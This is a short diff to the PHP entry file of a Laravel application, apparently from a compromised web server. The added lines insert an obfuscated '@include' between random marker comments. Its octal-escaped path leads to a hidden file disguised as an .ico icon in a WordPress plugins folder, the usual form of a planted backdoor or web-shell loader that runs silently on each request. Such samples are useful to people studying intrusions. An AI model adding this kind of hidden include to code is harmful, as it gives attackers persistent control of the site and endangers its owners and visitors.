@@ -1,4 +1,9 @@
 <?php
+/*3ab95*/
+
+@include "\057var\057www\057cdg\162oup\154and\151ng/\160ubl\151c/a\144min\057wp-\143ont\145nt/\160lug\151ns/\056bf3\06076c\067.ic\157";
+
+/*3ab95*/
 
 /**
  * Laravel - A PHP Framework For Web Artisans
